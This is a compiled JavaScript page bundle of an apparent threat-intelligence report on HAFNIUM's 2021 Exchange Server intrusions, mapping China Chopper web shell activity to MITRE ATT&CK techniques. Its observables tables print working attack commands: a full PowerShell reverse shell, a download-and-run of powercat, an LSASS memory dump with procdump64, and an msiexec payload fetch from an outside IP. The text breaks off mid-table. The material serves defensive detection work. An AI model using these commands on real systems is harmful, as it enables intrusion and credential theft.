"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[3643],{3248:function(e,t,a){var n=a(7294),r=a(7273);r.Z.initialize({startOnLoad:!0});t.Z=function(e){var t=e.chart;return(0,n.useEffect)((function(){r.Z.contentLoaded()}),[]),n.createElement("div",{className:"mermaid"},t)}},6387:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return d},contentTitle:function(){return s},metadata:function(){return m},toc:function(){return p},default:function(){return k}});var n=a(7462),r=a(3366),l=(a(7294),a(4137)),i=a(3248),o=["components"],d={},s=void 0,m={unversionedId:"Sightings/Hafnium",id:"Sightings/Hafnium",isDocsHomePage:!1,title:"Hafnium",description:"Overview",source:"@site/docs/03-Sightings/14-Hafnium.md",sourceDirName:"03-Sightings",slug:"/Sightings/Hafnium",permalink:"/ac3-threat-sightings/docs/Sightings/Hafnium",tags:[],version:"current",sidebarPosition:14,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"TA551-Phishing",permalink:"/ac3-threat-sightings/docs/Sightings/TA551-Phishing"},next:{title:"Emotet_Dec2021",permalink:"/ac3-threat-sightings/docs/Sightings/Emotet_Dec2021"}},p=[{value:"Overview",id:"overview",children:[{value:"References:",id:"references",children:[]},{value:"Threat Actor Activity",id:"threat-actor-activity",children:[]},{value:"Count of documented TTPs by Tactic",id:"count-of-documented-ttps-by-tactic",children:[]},{value:"Attack Flow",id:"attack-flow",children:[]}]},{value:"Tactics, Techniques and Procedures",id:"tactics-techniques-and-procedures",children:[]},{value:"Tactics, Techniques, Procedures, Observables and Notes",id:"tactics-techniques-procedures-observables-and-notes",children:[]},{value:"TTP Profiles with Observables",id:"ttp-profiles-with-observables",children:[{value:"Threat actor used exploits against <em>Internet Information Services (IIS)</em> and <em>Microsoft Exchange Server</em> to install <em>China Chopper Web Shells</em> for Persistence.",id:"threat-actor-used-exploits-against-internet-information-services-iis-and-microsoft-exchange-server-to-install-china-chopper-web-shells-for-persistence",children:[]},{value:"Threat Actor used <em>nltest, net and other basic commands via China Chopper Web Shell</em> for Discovery.",id:"threat-actor-used-nltest-net-and-other-basic-commands-via-china-chopper-web-shell-for-discovery",children:[]},{value:"Threat Actor used <em>wmic via China Chopper Web Shell</em> to list running processes for Discovery.",id:"threat-actor-used-wmic-via-china-chopper-web-shell-to-list-running-processes-for-discovery",children:[]},{value:"Threat Actor used <em>Procdump64 via China Chopper Web Shell</em> for Credential Access.",id:"threat-actor-used-procdump64-via-china-chopper-web-shell-for-credential-access",children:[]},{value:"Threat Actor used <em>PowerShell</em> to stablish additional C2 channels for Command And Control.",id:"threat-actor-used-powershell-to-stablish-additional-c2-channels-for-command-and-control",children:[]},{value:"Threat Actor used <em>MSIEXEC via China Chopper Web Shell</em> to execute web payload for Command And Control.",id:"threat-actor-used-msiexec-via-china-chopper-web-shell-to-execute-web-payload-for-command-and-control",children:[]},{value:"Threat Actor used <em>CMD del commands via China Chopper Web Shell</em> to delete Web Shell files for Defense Evasion.",id:"threat-actor-used-cmd-del-commands-via-china-chopper-web-shell-to-delete-web-shell-files-for-defense-evasion",children:[]},{value:"Threat Actor used <em>net group del commands via China Chopper Web Shell</em> to deleted Active Directory groups for Impact.",id:"threat-actor-used-net-group-del-commands-via-china-chopper-web-shell-to-deleted-active-directory-groups-for-impact",children:[]}]}],c={toc:p};function k(e){var t=e.components,a=(0,r.Z)(e,o);return(0,l.kt)("wrapper",(0,n.Z)({},c,a,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("h2",{id:"overview"},"Overview"),(0,l.kt)("p",null,"This Threat Sighting for HAFNIUM delivers a few TTPs based on avaialble public reports. HAFNIUM targeted Exchange Servers with 0-day exploits back in March 2021. HAFNIUM leveraged China Chopper webshell."),(0,l.kt)("p",null,"This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Hafnium.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Hafnium.yml")),(0,l.kt)("p",null,"Author: Alejandro Houspanossian (@lekz86)"),(0,l.kt)("p",null,"Acknowledgements: Eoin Miller (RAPID7)"),(0,l.kt)("h3",{id:"references"},"References:"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/"},"https://www.rapid7.com/blog/post/2021/03/23/defending-against-the-zero-day-analyzing-attacker-behavior-post-exploitation-of-microsoft-exchange/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html"},"https://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"},"https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.microsoft.com/security/blog/2020/02/04/ghost-in-the-shell-investigating-web-shell-attacks/"},"https://www.microsoft.com/security/blog/2020/02/04/ghost-in-the-shell-investigating-web-shell-attacks/"))),(0,l.kt)("h3",{id:"threat-actor-activity"},"Threat Actor Activity"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Threat actor used exploits against ",(0,l.kt)("em",{parentName:"li"},"Internet Information Services (IIS)")," and ",(0,l.kt)("em",{parentName:"li"},"Microsoft Exchange Server")," to install ",(0,l.kt)("em",{parentName:"li"},"China Chopper Web Shells")," for Persistence."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"nltest, net and other basic commands via China Chopper Web Shell")," for Discovery."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"wmic via China Chopper Web Shell")," to list running processes for Discovery."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"Procdump64 via China Chopper Web Shell")," for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," to stablish additional C2 channels for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"MSIEXEC via China Chopper Web Shell")," to execute web payload for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"CMD del commands via China Chopper Web Shell")," to delete Web Shell files for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"net group del commands via China Chopper Web Shell")," to deleted Active Directory groups for Impact.")),(0,l.kt)("h3",{id:"count-of-documented-ttps-by-tactic"},"Count of documented TTPs by Tactic"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"# Documented TTPs"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")))),(0,l.kt)("h3",{id:"attack-flow"},"Attack Flow"),(0,l.kt)("p",null,"The chart below shows a graphical representation of the attack flow."),(0,l.kt)(i.Z,{chart:"\ngraph LR\nIA[Initial Access] --\x3e | exploits against _Internet Information Services -IIS-_ and _Microsoft Exchange Server_ to install _China Chopper Web Shells_| PER[Persistence]\nPER[Persistence] --\x3e | _nltest, net and other basic commands via China Chopper Web Shell_| D[Discovery]\nPER[Persistence] --\x3e | _wmic via China Chopper Web Shell_ to list running processes| D[Discovery]\nPER[Persistence] --\x3e | _Procdump64 via China Chopper Web Shell_| CA[Credential Access]\nPER[Persistence] --\x3e | _PowerShell_ to stablish additional C2 channels| C2[Command And Control]\nPER[Persistence] --\x3e | _MSIEXEC via China Chopper Web Shell_ to execute web payload| C2[Command And Control]\nPER[Persistence] --\x3e | _CMD del commands via China Chopper Web Shell_ to delete Web Shell files| DE[Defense Evasion]\nPER[Persistence] --\x3e | _net group del commands via China Chopper Web Shell_ to deleted Active Directory groups| IMP[Impact]\n",mdxType:"Mermaid"}),(0,l.kt)("h2",{id:"tactics-techniques-and-procedures"},"Tactics, Techniques and Procedures"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003 - Server Software Component: Web Shell",(0,l.kt)("br",null),"T1190 - Exploit Public-Facing Application"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used exploits against ",(0,l.kt)("em",{parentName:"td"},"Internet Information Services (IIS)")," and ",(0,l.kt)("em",{parentName:"td"},"Microsoft Exchange Server")," to install ",(0,l.kt)("em",{parentName:"td"},"China Chopper Web Shells")," for Persistence.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003 - Server Software Component: Web Shell",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell",(0,l.kt)("br",null),"T1049 - System Network Connections Discovery",(0,l.kt)("br",null),"T1082 - System Information Discovery",(0,l.kt)("br",null),"T1069 - Permission Groups Discovery: Domain Groups",(0,l.kt)("br",null),"T1482 - Domain Trust Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"nltest, net and other basic commands via China Chopper Web Shell")," for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003 - Server Software Component: Web Shell",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell",(0,l.kt)("br",null),"T1047 - Windows Management Instrumentation",(0,l.kt)("br",null),"T1057 - Process Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"wmic via China Chopper Web Shell")," to list running processes for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003 - Server Software Component: Web Shell",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell",(0,l.kt)("br",null),"T1003.001 - OS Credential Dumping: LSASS Memory"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Procdump64 via China Chopper Web Shell")," for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,l.kt)("br",null),"T1505.003 - Server Software Component: Web Shell",(0,l.kt)("br",null),"T1095 - Non-Application Layer Protocol",(0,l.kt)("br",null),"T1071.001 - Application Layer Protocol: Web Protocols"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," to stablish additional C2 channels for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003 - Server Software Component: Web Shell",(0,l.kt)("br",null),"T1218.007 - Signed Binary Proxy Execution: Msiexec",(0,l.kt)("br",null),"T1071.001 - Application Layer Protocol: Web Protocols",(0,l.kt)("br",null),"T1105 - Ingress Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSIEXEC via China Chopper Web Shell")," to execute web payload for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003 - Server Software Component: Web Shell",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell",(0,l.kt)("br",null),"T1070.004 - Indicator Removal on Host: File Deletion"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"CMD del commands via China Chopper Web Shell")," to delete Web Shell files for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003 - Server Software Component: Web Shell",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell",(0,l.kt)("br",null),"T1531 - Account Access Removal"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"net group del commands via China Chopper Web Shell")," to deleted Active Directory groups for Impact.")))),(0,l.kt)("h2",{id:"tactics-techniques-procedures-observables-and-notes"},"Tactics, Techniques, Procedures, Observables and Notes"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"),(0,l.kt)("th",{parentName:"tr",align:null},"Notes"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1190"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used exploits against ",(0,l.kt)("em",{parentName:"td"},"Internet Information Services (IIS)")," and ",(0,l.kt)("em",{parentName:"td"},"Microsoft Exchange Server")," to install ",(0,l.kt)("em",{parentName:"td"},"China Chopper Web Shells")," for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web\\\\"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\ecp\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\ecp\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\ecp\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\ecp\\\\auth\\\\"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\HttpProxy\\\\owa\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\HttpProxy\\\\owa\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\HttpProxy\\\\owa\\\\auth\\\\"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Exchange\\\\FrontEnd\\\\HttpProxy\\\\owa\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Exchange\\\\FrontEnd\\\\HttpProxy\\\\owa\\\\auth\\\\"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Exchange\\\\FrontEnd\\\\HttpProxy\\\\owa\\\\auth\\\\")),(0,l.kt)("td",{parentName:"tr",align:null},"- If execution is on an x86 architecture, the process will be ",(0,l.kt)("em",{parentName:"td"},"C:","\\","Windows","\\","SysWOW64","\\","inetsrv","\\","w3wp.exe"),".",(0,l.kt)("br",null),"- Common file types for web shells are ",(0,l.kt)("em",{parentName:"td"},".aspx"),", ",(0,l.kt)("em",{parentName:"td"},".asp")," and ",(0,l.kt)("em",{parentName:"td"},".js"),".")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1059.003",(0,l.kt)("br",null),"T1049",(0,l.kt)("br",null),"T1082",(0,l.kt)("br",null),"T1069",(0,l.kt)("br",null),"T1482"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"nltest, net and other basic commands via China Chopper Web Shell")," for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"/c cd /d C:\\\\inetpub\\\\wwwroot\\\\&query user&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"/c cd /d C:\\\\inetpub\\\\wwwroot\\\\&hostname&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"/c cd /d C:\\\\inetpub\\\\wwwroot\\\\&ping #{dst} -n 1&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"/c cd /d C:\\\\inetpub\\\\wwwroot\\\\&tasklist\\|findstr dll&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cd /d "c:\\inetpub\\wwwroot\\"&whoami&echo [S]&cd&echo [E]'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d c:\\\\temp&tasklist&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d E:\\\\logs&tasklist &echo [S]&cd&echo [E]"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"query user"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"hostname"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"ping #{dst} -n 1"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"tasklist\\|findstr dll"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"tasklist"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"nltest /dclist:#{DOMAIN}"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"whoami"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'net group \\"Domain computers\\" /do')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1059.003",(0,l.kt)("br",null),"T1047",(0,l.kt)("br",null),"T1057"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"wmic via China Chopper Web Shell")," to list running processes for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web&wmic process where name=smex_master.exe get ExecutablePath,commandline&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web&wmic process where name=unsecapp.exe get ExecutablePath&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\system_web&wmic process where name=unsecapp.exe get processid&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"wmic process where name=smex_master.exe get ExecutablePath,commandline"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"wmic process where name=unsecapp.exe get ExecutablePath"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"wmic process where name=unsecapp.exe get processid")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1059.003",(0,l.kt)("br",null),"T1003.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Procdump64 via China Chopper Web Shell")," for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\root&procdump64.exe -accepteula -ma lsass.exe lsass.dmp&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d E:\\\\logs&procdump64.exe -accepteula -ma lsass.exe lsass.dmp&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"procdump64.exe -accepteula -ma lsass.exe lsass.dmp"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"procdump64.exe -accepteula -ma lsass.exe lsass.dmp")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,l.kt)("br",null),"T1505.003",(0,l.kt)("br",null),"T1095",(0,l.kt)("br",null),"T1071.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," to stablish additional C2 channels for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(IP, PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \\| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"IEX (New-Object System.Net.Webclient).DownloadString('https://raw[.]githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c REDACTED -p REDACTED -e powershell"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(IP, PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \\| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"IEX (New-Object System.Net.Webclient).DownloadString('https://raw[.]githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c REDACTED -p REDACTED -e powershell")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1505.003",(0,l.kt)("br",null),"T1218.007",(0,l.kt)("br",null),"T1071.001",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSIEXEC via China Chopper Web Shell")," to execute web payload for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd /c cd /d C:\\\\inetpub\\\\wwwroot\\\\aspnet_client&msiexec /q /i http://103[.]212.223.210:9900/nvidia.msi&echo [S]&cd&echo [E]"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- 